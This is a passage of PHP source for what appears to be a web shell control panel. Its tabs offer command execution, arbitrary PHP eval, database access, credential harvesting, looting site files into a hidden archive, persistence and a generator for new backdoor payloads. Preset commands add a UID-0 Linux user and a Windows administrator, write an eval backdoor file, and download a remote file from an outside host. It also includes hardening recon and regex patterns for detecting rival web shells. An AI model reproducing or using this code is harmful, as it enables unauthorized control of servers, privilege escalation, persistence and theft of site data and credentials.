echo '<span class="sep">|</span>SELF ' . ($_self['w'] == '-' ? '<span class="ok">LOCKED</span>' : '<span class="warn">W:' . htmlspecialchars($_self['w']) . '</span>');
echo ' ' . $_self['perm'] . ' ' . substr($_self['sum'], 0, 8) . ($_spare ? ' <span class="ok">SPARE x' . $_spare . '</span>' : ' <span class="bad">NO-SPARE</span>');
echo '<span class="sep">|</span>' . @date('H:i:s') . ' ' . htmlspecialchars(substr((string)@gethostname(), 0, 24)) . '</div>';
    }
}
opx_bar();
?></div>
<?php
$menu = array('file' => 'File Mgr', 'scan' => 'Searcher', 'antivirus' => 'Antivirus', 'backshell' => 'Bind Port', 'exec' => 'Exec CMD', 'phpeval' => 'Exec PHP', 'sql' => 'Exec SQL', 'info' => 'System', 'gsocket' => 'GSocket', 'recon' => 'Recon', 'escape' => 'Escape', 'creds' => 'Creds', 'loot' => 'Loot', 'persist' => 'Persist', 'ghost' => 'Ghost', 'arsenal' => 'Arsenal', 'payload' => 'Payload');
$go = isset($_POST['go']) ? (string)$_POST['go'] : 'file';
$nowdir = isset($nowdir) ? $nowdir : (isset($_POST['dir']) && $_POST['dir'] !== '' ? strdir(chop($_POST['dir']) . '/') : THISDIR);
$hot = array('recon', 'escape', 'creds', 'loot', 'persist', 'ghost', 'arsenal', 'payload');
echo '<div class="tag">';
foreach ($menu as $key => $name) {
    $cls = array();
    if ($go == $key) {
        $cls[] = 'current';
    }
    if (in_array($key, $hot)) {
        $cls[] = 'hot';
    }
    echo '<a' . ($cls ? ' class="' . implode(' ', $cls) . '"' : '') . ' href="javascript:void(0);" onclick="go(\'' . $key . '\',\'' . base64_encode($nowdir) . '\');">' . $name . '</a> ';
}
echo '</div>';
echo '<form name="gofrm" id="gofrm" method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="">';
echo '<input type="hidden" name="godir" id="godir" value="' . $nowdir . '">';
echo '<input type="hidden" name="govar" id="govar" value="">';
echo '</form>';
opx_init();
$hot = array('recon', 'escape', 'creds', 'loot', 'persist', 'ghost', 'arsenal', 'payload');
$case = in_array($go, $hot) ? $go : 'zz_orig';
switch ($case) {
case "recon":
    opx_box('Recon', 'xi_recon', 'full box context: identity, exec chain, hardening, presence', array(
        array('Scan', $OPXJI['recon']),
        array('Arsenal', $OPXJI['arsenal']),
        array('Ghost', $OPXJI['ghost']),
    ));
    break;
case "escape":
    opx_box('Escape', 'xi_escape', 'privilege + container boundary probe (read-only)', array(
        array('Probe', $OPXJI['escape']),
        array('Creds', $OPXJI['creds']),
    ));
    break;
case "creds":
    opx_box('Creds', 'xi_creds', 'configs, keys and shell history already on disk', array(
        array('Harvest', $OPXJI['creds']),
    ));
    break;
case "loot":
    echo '<form method="POST" onsubmit="return false;"><div class="actall"><b>Loot</b> <span class="small">seals site files + identity + history into one gz dotfile</span> ';
    echo '<input type="text" id="loot_o" value="' . htmlspecialchars(THISDIR . '.' . substr(md5(OPX_PATH . 'l'), 0, 5) . '.lz') . '" size="52" style="font-family:Consolas,monospace"> ';
    echo '<input type="button" value="Pack" onclick="OPX.run(\'loot\',{o:$(\'loot_o\').value},\'con\')"> <span class="opx-b b">xi_loot</span></div></form>';
    echo '<div class="opx-con" id="con"><div class="c4">ready - target path above</div></div>';
    break;
case "persist":
    echo '<form method="POST" onsubmit="return false;"><div class="actall"><b>Persist</b> <span class="small">independent retention vectors: cold copy, null index walker, beacon re-arm</span> ';
    echo '<input type="button" value="Install" onclick="OPX.run(\'persist\',{op:\'add\'},\'con\')"> ';
    echo '<input type="button" value="Clean" onclick="if(confirm(\'Remove every retention vector on this node?\')){OPX.run(\'persist\',{op:\'clean\'},\'con\')}"> <span class="opx-b r">reversible</span></div></form>';
    echo '<div class="opx-con" id="con"><div class="c4">ready</div></div>';
    break;
case "ghost":
    echo '<form method="POST" onsubmit="return false;"><div class="actall"><b>Ghost</b> <span class="small">presence: arm, verify cold copies, restore front-end</span> ';
    echo '<input type="button" value="Status" onclick="OPX.run(\'ghost\',{op:\'status\'},\'con\')"> ';
    echo '<input type="button" value="Arm" onclick="OPX.run(\'ghost\',{op:\'arm\'},\'con\')"> ';
    echo '<input type="button" value="Heal" onclick="OPX.run(\'ghost\',{op:\'heal\'},\'con\')"> <span class="opx-b g">durable</span></div></form>';
    echo '<div class="opx-con" id="con"><div class="c4">ready</div></div>';
    break;
case "arsenal":
    opx_box('Arsenal', 'xi_arsenal', 'binaries, interpreters, net, safe write dirs on this box', array(
        array('Inventory', $OPXJI['arsenal']),
    ));
    break;
case "payload":
    echo '<form method="POST" onsubmit="return false;"><div class="actall"><b>Payload</b> <span class="small">generate a matching front-end for the next host</span> ';
    echo '<select id="pl_m"><option value="raw">verbatim</option><option value="b64">base64 eval</option><option value="px">password gated</option></select> ';
    echo '<input type="text" id="pl_k" value="" size="14" placeholder="pass (px mode)"> ';
    echo '<input type="button" value="Build" onclick="OPX.run(\'payload\',{m:$(\'pl_m\').value,k:$(\'pl_k\').value},\'con\')"> ';
    echo '<input type="button" value="Copy" onclick="opxCopy(\'con\')"> <span class="opx-b y">xi_payload</span></div></form>';
    echo '<div class="opx-con" id="con" style="height:320px"><div class="c4">ready - choose a mode</div></div>';
    break;
case "zz_orig":
switch ($go) {
    case "info":
        if (EXISTS_PHPINFO) {
            ob_start();
            phpinfo(INFO_GENERAL);
            $out = ob_get_contents();
            ob_end_clean();
            $tmp = array();
            preg_match_all('/\\<td class\\=\\"e\\"\\>.*?(Command|Configuration)+.*?\\<\\/td\\>\\<td class\\=\\"v\\"\\>(.*?)\\<\\/td\\>/i', $out, $tmp);
            $config = $tmp[2][0];
            $phpini = $tmp[2][2] ? $tmp[2][1] . ' --- ' . $tmp[2][2] : $tmp[2][1];
        }
        $infos = array('Browser Info' => $_SERVER['HTTP_USER_AGENT'], 'Disabled Functions' => get_cfg_var("disable_functions") ? get_cfg_var("disable_functions") : '(None)', 'Disabled Class' => get_cfg_var("disable_classes") ? get_cfg_var("disable_classes") : '(None)', 'PHP.ini Path' => $phpini ? $phpini : '(None)', 'PHP Method' => php_sapi_name(), 'PHP Version' => PHP_VERSION, 'PHP PID' => getmypid(), 'Server IP' => $_SERVER['REMOTE_ADDR'], 'Encoding' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'Web Port' => $_SERVER['SERVER_PORT'], 'Root Directory' => $_SERVER['DOCUMENT_ROOT'], 'Shell Location' => $_SERVER['SCRIPT_FILENAME'], 'CGI Version' => $_SERVER['GATEWAY_INTERFACE'], 'Webmaster Email' => $_SERVER['SERVER_ADMIN'] ? $_SERVER['SERVER_ADMIN'] : '(None)', 'Disk Size' => size(disk_total_space('.')), 'Free Space' => size(disk_free_space('.')), 'Limit POST' => get_cfg_var("post_max_size"), 'Max Upload' => get_cfg_var("upload_max_filesize"), 'Limit Memory' => get_cfg_var("memory_limit"), 'Max Exec Time' => get_cfg_var("max_execution_time") . ' Second', 'Fsockopen Support' => function_exists('fsockopen') ? 'Yes' : 'No', 'Socket Support' => function_exists('socket_close') ? 'Yes' : 'No', 'Pcntl Support' => function_exists('pcntl_exec') ? 'Yes' : 'No', 'Curl Support' => function_exists('curl_version') ? 'Yes' : 'No', 'Zlib Support' => function_exists('gzclose') ? 'Yes' : 'No', 'FTP Support' => function_exists('ftp_login') ? 'Yes' : 'No', 'XML Support' => function_exists('xml_set_object') ? 'Yes' : 'No', 'GD_Library Support' => function_exists('imageline') ? 'Yes' : 'No', 'COM Formation Support' => class_exists('COM') ? 'Yes' : 'No', 'ODBC Components Support' => function_exists('odbc_close') ? 'Yes' : 'No', 'IMAP Mail Support' => function_exists('imap_close') ? 'Yes' : 'No', 'Safe Mode Support' => get_cfg_var("safemode") ? 'Yes' : 'No', 'URL Fopen Support' => get_cfg_var("allow_url_fopen") ? 'Yes' : 'No', 'Dynamic Libraries Support' => get_cfg_var("enable_dl") ? 'Yes' : 'No', 'Display Error Support' => get_cfg_var("display_errors") ? 'Yes' : 'No', 'Register Global Support' => get_cfg_var("register_globals") ? 'Yes' : 'No', 'Magic Quotes Support' => get_cfg_var("magic_quotes_gpc") ? 'Yes' : 'No', 'PHP Compiler' => $config ? $config : '(None)');
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<table class="tables"><tr><th style="width:26%;">Name</th><th>Parameter</th></tr>';
        if (!$win) {
            $sr = function($c) { $r = command($c . ' 2>/dev/null', THISDIR); return trim((string)$r['res']); };
            $pself = (string)@file_get_contents('/proc/self/status');
            // AppArmor
            $aa = trim((string)@file_get_contents('/proc/sys/kernel/apparmor_enabled'));
            if ($aa === '1') {
                $aa_cnt = $sr("wc -l < /sys/kernel/security/apparmor/profiles");
                $aa_disp = '<h1>ON</h1>' . ($aa_cnt ? ' (' . $aa_cnt . ' profiles)' : '');
            } else {
                $aa_disp = '<h2>OFF / N/A</h2>';
            }
            // SELinux
            $sel = trim((string)@file_get_contents('/proc/sys/kernel/selinux'));
            if ($sel === '1') {
                $sel_mode = $sr('getenforce');
                $sel_disp = $sel_mode ? '<h1>' . htmlspecialchars($sel_mode) . '</h1>' : '<h1>ON</h1>';
            } else {
                $sel_disp = '<h2>disabled</h2>';
            }
            // seccomp
            preg_match('/Seccomp:\s*(\d+)/', $pself, $scm);
            $sc = isset($scm[1]) ? $scm[1] : '';
            $sc_disp = $sc === '0' ? '<h2>0 (off)</h2>' : ($sc !== '' ? '<b>' . $sc . ' (active)</b>' : 'N/A');
            // ptrace_scope
            $pt = trim((string)@file_get_contents('/proc/sys/kernel/yama/ptrace_scope'));
            if ($pt === '0') $pt_disp = '<h2>0 &mdash; unrestricted</h2>';
            elseif ($pt === '1') $pt_disp = '<b>1 &mdash; child only</b>';
            elseif ($pt === '2') $pt_disp = '<h1>2 &mdash; admin only</h1>';
            elseif ($pt === '3') $pt_disp = '<h1>3 &mdash; disabled</h1>';
            else $pt_disp = $pt !== '' ? htmlspecialchars($pt) : '<h2>N/A (no Yama)</h2>';
            // userns
            $uns = trim((string)@file_get_contents('/proc/sys/kernel/unprivileged_userns_clone'));
            if ($uns === '') $uns = trim((string)@file_get_contents('/proc/sys/user/max_user_namespaces'));
            $uns_disp = $uns === '0' ? '<b>disabled</b>' : ($uns !== '' ? '<h2>enabled</h2>' : 'N/A');
            // /tmp noexec
            $mounts = (string)@file_get_contents('/proc/mounts');
            $tmp_disp = preg_match('#\s/tmp\s\S+\s\S*noexec#', $mounts) ? '<h1>noexec</h1>' : '<h2>exec ok</h2>';
            // container
            $cg1 = (string)@file_get_contents('/proc/1/cgroup');
            if (file_exists('/.dockerenv') || preg_match('/docker|lxc|containerd/i', $cg1)) {
                $cont_disp = '<b>Docker / LXC</b>';
            } elseif (@file_get_contents('/run/systemd/container')) {
                $cont_disp = '<b>' . htmlspecialchars(trim((string)@file_get_contents('/run/systemd/container'))) . '</b>';
            } else {
                $cont_disp = 'none (bare-metal)';
            }
            // capabilities (self + interesting system binaries)
            $cap_disp = 'N/A';
            if (preg_match('/CapEff:\s*([0-9a-f]+)/i', $pself, $cm)) {
                $cv = hexdec($cm[1]);
                $cap_map = array(0=>'CHOWN',1=>'DAC_OVERRIDE',2=>'DAC_READ_SEARCH',6=>'SETUID',7=>'SETGID',12=>'NET_ADMIN',19=>'SYS_PTRACE',20=>'SYS_PACCT',21=>'SYS_ADMIN',23=>'SYS_CHROOT');
                $found = array();
                foreach ($cap_map as $bit => $n) { if ($cv & (1 << $bit)) $found[] = $n; }
                $cap_disp = $found ? '<h2>' . implode(', ', $found) . '</h2>' : '(none effective)';
            }
            $sc_bins = $sr("getcap -r /usr /bin /sbin /lib 2>/dev/null | grep -E 'sys_admin|sys_ptrace|setuid|setgid|dac_override|net_raw' | head -5");
            if ($sc_bins) $cap_disp .= ' &mdash; <b>syscap:</b> ' . nl2br(htmlspecialchars($sc_bins));
            // sudo group
            $id_out = $sr('id');
            $sudo_disp = (preg_match('/\(sudo\)/', $id_out) || preg_match('/\bsudo\b/', $id_out))
                ? '<h2>&#9650; YES &mdash; ' . htmlspecialchars($id_out) . '</h2>'
                : htmlspecialchars($id_out);
            echo '<tr style="background:#EEE685"><td colspan="2"><b>Security Indicators</b></td></tr>';
            echo '<tr><td>AppArmor</td><td>' . $aa_disp . '</td></tr>';
            echo '<tr><td>SELinux</td><td>' . $sel_disp . '</td></tr>';
            echo '<tr><td>seccomp</td><td>' . $sc_disp . '</td></tr>';
            echo '<tr><td>ptrace_scope</td><td>' . $pt_disp . '</td></tr>';
            echo '<tr><td>userns</td><td>' . $uns_disp . '</td></tr>';
            echo '<tr><td>/tmp noexec</td><td>' . $tmp_disp . '</td></tr>';
            echo '<tr><td>Container</td><td>' . $cont_disp . '</td></tr>';
            echo '<tr><td>Capabilities</td><td>' . $cap_disp . '</td></tr>';
            echo '<tr><td>sudo group</td><td>' . $sudo_disp . '</td></tr>';
            echo '<tr><td colspan="2" style="height:4px;background:#CCCCCC"></td></tr>';
        }
        foreach ($infos as $name => $var) {
            echo '<tr><td>' . $name . '</td><td>' . $var . '</td></tr>';
        }
        echo '</table>';
        break;
    case "exec":
        $cmd = $win ? 'dir' : 'ls -al';
        $res = array('res' => 'Result Command', 'msg' => $msg);
        $str = isset($_POST['str']) ? $_POST['str'] : 'fun';
        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            $cwd = $str == 'fun' ? THISDIR : 'com';
            $res = command($cmd, $cwd);
        }
        echo '<div class="msgbox">' . $res['msg'] . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="exec">';
        echo '<div class="actall">Command <input type="text" name="cmd" id="cmd" value="' . htmlspecialchars($cmd) . '" style="width:398px;"> ';
        echo '<select name="str">';
        $selects = array('fun' => 'phpfun', 'com' => 'wscript');
        foreach ($selects as $var => $name) {
            echo '<option value="' . $var . '"' . ($var == $str ? ' selected' : '') . '>' . $name . '</option>';
        }
        echo '</select> ';
        echo '<select onchange="$(\'cmd\').value=options[selectedIndex].value">';
        echo '<option>---CMD Executor---</option>';
        echo '<option value="echo ' . htmlspecialchars('"<?php phpinfo();?>"') . ' >> ' . THISDIR . 'haxorid.txt">Write File</option>';
        echo '<option value="whoami">Who Am I</option>';
        echo '<option value="net user sysadmin R00t@willy16 /add">Add User (Win)</option>';
        echo '<option value="net localgroup administrators sysadmin /add">Add Group (Win)</option>';
        echo '<option value="netstat -an">View Port (Win)</option>';
        echo '<option value="ipconfig /all">View Address (Win)</option>';
        echo '<option value="net start">View Service (Win)</option>';
        echo '<option value="tasklist">View Process (Win)</option>';
        echo '<option value="id;uname -a;cat /etc/issue;cat /proc/version;lsb_release -a">Version Collection (Linux)</option>';
        echo '<option value="/usr/sbin/useradd -u 0 -o -g 0 sysadmin">Add User (Linux)</option>';
        echo '<option value="cat /etc/passwd">View Users (Linux)</option>';
        echo '<option value="/bin/netstat -tnl">View Port (Linux)</option>';
        echo '<option value="/sbin/ifconfig -a">View Address (Linux)</option>';
        echo '<option value="/sbin/chkconfig --list">View Service (Linux)</option>';
        echo '<option value="/bin/ps -ef">View Process (Linux)</option>';
        echo '</select> ';
        echo '<input type="submit" style="width:50px;" value="Go">';
        echo '</div><div class="actall"><textarea style="width:698px;height:368px;">' . htmlspecialchars($res['res']) . '</textarea></div></form>';
        break;
    case "scan":
        $scandir = empty($_POST['dir']) ? base64_decode($_POST['govar']) : $nowdir;
        $keyword = isset($_POST['keyword']) ? $_POST['keyword'] : '';
        $include = isset($_POST['include']) ? chop($_POST['include']) : '.php|.asp|.asa|.cer|.aspx|.jsp|.cgi|.sh|.pl|.py';
        $filters = isset($_POST['filters']) ? chop($_POST['filters']) : 'html|css|img|images|image|style|js';
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="scan">';
        echo '<table class="tables"><tr><th style="width:15%;">Name</th><th>Setup</th></tr>';
        echo '<tr><td>Search path</td><td><input type="text" name="dir" value="' . htmlspecialchars($scandir) . '" style="width:500px;"></td></tr>';
        echo '<tr><td>Search content</td><td><input type="text" name="keyword" value="' . htmlspecialchars($keyword) . '" style="width:500px;"> (File name or file content)</td></tr>';
        echo '<tr><td>File extension</td><td><input type="text" name="include" value="' . htmlspecialchars($include) . '" style="width:500px;"> (Separate with "|", empty = search all files)</td></tr>';
        echo '<tr><td>Filter Dir</td><td><input type="text" name="filters" value="' . htmlspecialchars($filters) . '" style="width:500px;"> (Separate with "|", empty = not filtered)</td></tr>';
        echo '<tr><td>Search method</td><td><label><input type="radio" name="type" value="0"' . ($_POST['type'] ? '' : ' checked') . '>File name</label> ';
        echo '<label><input type="radio" name="type" value="1"' . ($_POST['type'] ? ' checked' : '') . '>Contains inside</label> ';
        echo '<label><input type="checkbox" name="char" value="1"' . ($_POST['char'] ? ' checked' : '') . '>Match case</label></td></tr>';
        echo '<tr><td>Search scope</td><td><label><input type="radio" name="range" value="0"' . ($_POST['range'] ? '' : ' checked') . '>Apply the search to the folder, subfolders and files</label> ';
        echo '<label><input type="radio" name="range" value="1"' . ($_POST['range'] ? ' checked' : '') . '>Only apply search to this folder</label></td></tr>';
        echo '<tr><td>Action</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
        echo '</table></form>';
        if ($keyword != '') {
            flush();
            ob_flush();
            echo '<div style="padding:5px;background:#F8F8F8;text-align:left;">';
            $incs = $include == '' ? false : explode('|', $include);
            $fits = $filters == '' ? false : explode('|', $filters);
            $isread = scanfile(strdir($scandir . '/'), $keyword, $incs, $fits, $_POST['type'], $_POST['char'], $_POST['range'], $nowdir);
            echo '<p>' . ($isread ? '<h2>Search complete</h2>' : '<h1>Search failed</h1>') . '</p></div>';
        }
        break;
    case "antivirus":
        $scandir = empty($_POST['dir']) ? base64_decode($_POST['govar']) : $nowdir;
        $typearr = isset($_POST['dir']) ? $_POST['types'] : array('php' => '.php');
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="antivirus">';
        echo '<table class="tables"><tr><th style="width:15%;">Name</th><th>Setup</th></tr>';
        echo '<tr><td>Scan path</td><td><input type="text" name="dir" value="' . htmlspecialchars($scandir) . '" style="width:398px;"> (Regular matching)</td></tr>';
        echo '<tr><td>Type of killing</td><td>';
        $types = array('php' => '.php', 'asp+aspx' => '.as|.cs|.cer', 'jsp' => '.jsp');
        foreach ($types as $key => $ex) {
            echo '<label title="' . $ex . '"><input type="checkbox" name="types[' . $key . ']" value="' . $ex . '"' . ($typearr[$key] == $ex ? ' checked' : '') . '>' . $key . '</label> ';
        }
        echo '</td></tr><tr><td>Action</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
        echo '</table></form>';
        if (count($_POST['types']) > 0) {
            $matches = array('php' => array('/function\\_exists\\s*\\(\\s*[\'|\\"](popen|exec|proc\\_open|system|passthru)+[\'|\\"]\\s*\\)/i', '/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\s*\\)/i', '/(udp\\:\\/\\/(.*)\\;)+/i', '/preg\\_replace\\s*\\((.*)\\/e(.*)\\,\\s*\\$\\_(.*)\\,(.*)\\)/i', '/preg\\_replace\\s*\\((.*)\\(base64\\_decode\\(\\$/i', '/(eval|assert|include|require)+\\s*\\((.*)(base64\\_decode|file\\_get\\_contents|php\\:\\/\\/input)+/i', '/(eval|assert|include|require|array\\_map)+\\s*\\(\\s*\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\s*\\)/i', '/\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+(.*)(eval|assert|include|require)+\\s*\\(\\s*\\$(\\w+)\\s*\\)/i', '/\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\(\\s*\\$(.*)\\)/i', '/\\(\\s*\\$\\_FILES\\[(.*)\\]\\[(.*)\\]\\s*\\,\\s*\\$\\_FILES\\[(.*)\\]\\[(.*)\\]\\s*\\)/i', '/(fopen|fwrite|fpust|file\\_put\\_contents)+\\s*\\((.*)\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\](.*)\\)/i', '/echo\\s*curl\\_exec\\s*\\(\\s*\\$(\\w+)\\s*\\)/i', '/new com\\s*\\(\\s*[\'|\\"]shell(.*)[\'|\\"]\\s*\\)/i', '/\\$(.*)\\s*\\((.*)\\/e(.*)\\,\\s*\\$\\_(.*)\\,(.*)\\)/i', '/\\$\\_\\=(.*)\\$\\_/i'), 'asp+aspx' => array('/(VBScript\\.Encode|WScript\\.shell|Shell\\.Application|Scripting\\.FileSystemObject)+/i', '/(eval|execute)+(.*)(request|session)+\\s*\\((.*)\\)/i', '/(eval|execute)+(.*)request.item\\s*\\[(.*)\\]/i', '/request\\s*\\((.*)\\)(.*)(eval|execute)+\\s*\\((.*)\\)/i', '/\\<script\\s*runat\\s*\\=(.*)server(.*)\\>(.*)\\<\\/script\\>/i', '/Load\\s*\\((.*)Request/i', '/StreamWriter\\(Server\\.MapPath(.*)\\.Write\\(Request/i'), 'jsp' => array('/(eval|execute)+(.*)(request|session)+\\s*\\((.*)\\)/i', '/(eval|execute)+(.*)request.item\\s*\\[(.*)\\]/i', '/request\\s*\\((.*)\\)(.*)(eval|execute)+\\s*\\((.*)\\)/i', '/Runtime\\.getRuntime\\(\\)\\.exec\\((.*)\\)/i', '/FileOutputStream\\(application\\.getRealPath(.*)request/i'));
            flush();
            ob_flush();
            echo '<div style="padding:5px;background:#F8F8F8;text-align:left;">';
            $isread = antivirus(strdir($scandir . '/'), $typearr, $matches, $nowdir);
            echo '<p>' . ($isread ? '<h2>Scan complete</h2>' : '<h1>Scan failed</h1>') . '</p></div>';
        }
        break;
    case "phpeval":
        if (isset($_POST['phpcode'])) {
            $phpcode = chop($_POST['phpcode']);
            ob_start();
            if (substr($phpcode, 0, 2) == '<?' && substr($phpcode, -2) == '?>') {
                @eval('?>' . $phpcode . '<?php ');
            } else {
                @eval($phpcode);
            }
            $out = ob_get_contents();
            ob_end_clean();
        } else {
            $phpcode = 'phpinfo();';
            $out = 'Result Program';
        }
        echo base64_decode('PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmZ1bmN0aW9uIHJ1bmNvZGUob2JqbmFtZSkge3ZhciB3aW5uYW1lID0gd2luZG93Lm9wZW4oJycsIl9ibGFuayIsJycpO3ZhciBvYmogPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChvYmpuYW1lKTt3aW5uYW1lLmRvY3VtZW50Lm9wZW4oJ3RleHQvaHRtbCcsJ3JlcGxhY2UnKTt3aW5uYW1lLm9wZW5lciA9IG51bGw7d2lubmFtZS5kb2N1bWVudC53cml0ZShvYmoudmFsdWUpO3dpbm5hbWUuZG9jdW1lbnQuY2xvc2UoKTt9PC9zY3JpcHQ+');
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="phpeval">';
        echo '<div class="actall"><p><textarea name="phpcode" id="phpcode" style="width:698px;height:180px;">' . htmlspecialchars($phpcode) . '</textarea></p><p>';
        echo '<select onchange="$(\'phpcode\').value=options[selectedIndex].value">';
        echo '<option>---Common Code---</option>';
        echo '<option value="echo readfile(\'C:/web/haxor.php\');">Read file</option>';
        echo '<option value="$fp=fopen(\'C:/web/haxor.php\',\'w\');echo fputs($fp,\'<?php eval($_POST[cmd]);?>\')?\'Success!\':\'Fail!\';fclose($fp);">Write file</option>';
        echo '<option value="echo copy(\'C:/web/mi77i.php\',\'C:/web/haxor.php\')?\'Success!\':\'Fail!\';">Copy files</option>';
        echo '<option value="echo chmod(\'C:/web/mi77i.php\',0777)?\'Success!\':\'Fail!\';">Modify properties</option>';
        echo '<option value="echo file_put_contents(\'' . THISDIR . 'cmd.exe\', file_get_contents(\'http://hax.or.id/indo.txt\'))?\'Success!\':\'Fail!\';">Remote download</option>';
        echo '<option value="print_r($_SERVER);">Environment variable</option>';
        echo '</select> ';
        echo '<input type="submit" style="width:80px;" value="Go"></p></div>';
        echo '</form><div class="actall"><p><textarea id="evalcode" style="width:698px;height:180px;">' . htmlspecialchars($out) . '</textarea></p><p><input type="button" value="Run in HTML" onclick="runcode(\'evalcode\')"></p></div>';
        break;
    case "sql":
        if (!empty($_POST['sqlhost']) && !empty($_POST['sqluser']) && !empty($_POST['names'])) {
            $type = $_POST['type'];
            $sqlhost = $_POST['sqlhost'];
            $sqluser = $_POST['sqluser'];
            $sqlpass = $_POST['sqlpass'];
            $sqlname = $_POST['sqlname'];
            $sqlcode = $_POST['sqlcode'];
            $names = $_POST['names'];
            switch ($type) {
                case "PostgreSql":
                    if (function_exists('pg_close')) {
                        if (strstr($sqlhost, ':')) {
                            $array = explode(':', $sqlhost);
                            $sqlhost = $array[0];
                            $sqlport = $array[1];
                        } else {
                            $sqlport = 5432;
                        }
                        $dbconn = @pg_connect("host={$sqlhost} port={$sqlport} dbname={$sqlname} user={$sqluser} password={$sqlpass}");
                        if ($dbconn) {
                            $msg = '<h2>Connection' . $type . 'Success </h2>';
                            pg_query('set client_encoding=' . $names);
                            $result = pg_query($sqlcode);
                            if ($result) {
                                $msg .= '<h2> - SQL executed successfully</h2>';
                                while ($array = pg_fetch_array($result)) {
                                    $rows[] = $array;
                                }
                            } else {
                                $msg .= '<h1> - SQL execution failed</h1>';
                                $rows = array('error' => pg_result_error($result));
                            }
                            pg_free_result($result);
                        } else {
                            $msg = '<h1>Connection' . $type . 'Failure</h1>';
                        }
                        @pg_close($dbconn);
                    } else {
                        $msg = '<h1>Not support' . $type . '</h1>';
                    }
                    break;
                case "MsSql":
                    if (function_exists('mssql_close')) {
                        $dbconn = @mssql_connect($sqlhost, $sqluser, $sqlpass);
                        if ($dbconn) {
                            $msg = '<h2>Connection' . $type . 'Success </h2>';
                            mssql_select_db($sqlname, $dbconn);
                            $result = mssql_query($sqlcode);
                            if ($result) {
                                $msg .= '<h2> - SQL executed successfully</h2>';
                                while ($array = mssql_fetch_array($result)) {
                                    $rows[] = $array;
                                }
                            } else {
                                $msg .= '<h1> - SQL execution failed</h1>';
                            }
                            @mssql_free_result($result);
                        } else {
                            $msg = '<h1>Connection' . $type . 'Failure</h1>';
                        }
                        @mssql_close($dbconn);
                    } else {
                        $msg = '<h1>Not support' . $type . '</h1>';
                    }
                    break;
                case "Oracle":
                    if (function_exists('oci_close')) {
                        $conn = @oci_connect($sqluser, $sqlpass, $sqlhost . '/' . $sqlname);
                        if ($conn) {
                            $msg = '<h2>Connection' . $type . 'Success </h2>';
                            $stid = oci_parse($conn, $sqlcode);
                            oci_execute($stid);
                            if ($stid) {
                                $msg .= '<h2> - SQL executed successfully</h2>';
                                while ($array = oci_fetch_array($stid, OCI_ASSOC)) {
                                    $rows[] = $array;
                                }
                            } else {
                                $msg .= '<h1> - SQL execution failed</h1>';
                                $e = oci_error();
                                $rows = array('error' => $e['message']);
                            }
                            oci_free_statement($stid);
                        } else {
                            $e = oci_error();
                            $rows = array('error' => $e['message']);
                            $msg = '<h1>Connection' . $type . 'Failure</h1>';
                        }
                        @oci_close($conn);
                    } else {
                        $msg = '<h1>Not support' . $type . '</h1>';
                    }
                    break;
                case "MySql":
                    if (function_exists('mysql_close')) {
                        $conn = mysql_connect(strstr($sqlhost, ':') ? $sqlhost : $sqlhost . ':3306', $sqluser, $sqlpass, $sqlname);
                        if ($conn) {
                            $msg = '<h2>Connection' . $type . 'Success </h2>';
                            if (substr($sqlcode, 0, 7) == 't00lsa') {
                                $array = array();
                                $data = '';
                                $i = 0;
                                preg_match_all('/t00lsa\\s*\'(.*)\'\\s*t00lsb\\s*\'(.*)\'\\s*t00lsc\\s*\'(.*)\'\\s*t00lsfile\\s*\'(.*)\'/i', $sqlcode, $array);
                                if ($array[1][0] && $array[2][0] && $array[3][0] && $array[4][0]) {
                                    mysql_select_db($array[1][0], $conn);
                                    mysql_query('set names ' . $names, $conn);
                                    $spidercode = 'select ' . $array[3][0] . ' from `' . $array[2][0] . '`;';
                                    $result = mysql_query($spidercode, $conn);
                                    if ($result) {
                                        while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
                                            $data .= join(' |x| ', $row) . "\r\n";
                                            $i++;
                                        }
                                        if ($data) {
                                            $file = strdir($array[4][0]);
                                            $msg .= filew($file, $data, 'w') ? '<h2> - Successfully off the DB</h2>' : '<h1> - Failed to export file</h1>';
                                            $rows = array('file' => $file, size(filesize($file)) => 'Total acquisition' . $i . 'Article data');
                                        } else {
                                            $msg .= '<h1> - No data</h1>';
                                        }
                                    } else {
                                        $msg .= '<h1> - SQL execution failed</h1>';
                                        $rows = array('errno' => mysql_errno(), 'error' => mysql_error());
                                    }
                                } else {
                                    $msg .= '<h1> - Off-database statement error</h1>';
                                }
                            } elseif (!empty($sqlcode)) {
                                mysql_select_db($sqlname, $conn);
                                mysql_query('set names ' . $names, $conn);
                                $result = mysql_query($sqlcode, $conn);
                                if ($result) {
                                    $msg .= '<h2> - SQL executed successfully</h2>';
                                    while ($array = mysql_fetch_array($result, MYSQL_ASSOC)) {
                                        $rows[] = $array;
                                    }
                                } else {
                                    $msg .= '<h1> - SQL execution failed</h1>';
                                    $rows = array('errno' => mysql_errno(), 'error' => mysql_error());
                                }
                            }
                            mysql_free_result($result);
                        } else {
                            $msg = '<h1>Connection' . $type . 'Failure</h1>';
                            $rows = array('errno' => mysql_errno(), 'error' => mysql_error());
                        }
                        mysql_close($conn);
                    } else {
                        $msg = '<h1>Not Support' . $type . '</h1>';
                    }
                    break;
            }
        } else {
            $type = 'MySql';
            $sqlhost = 'localhost:3306';
            $sqluser = 'root';
            $sqlpass = '123456';
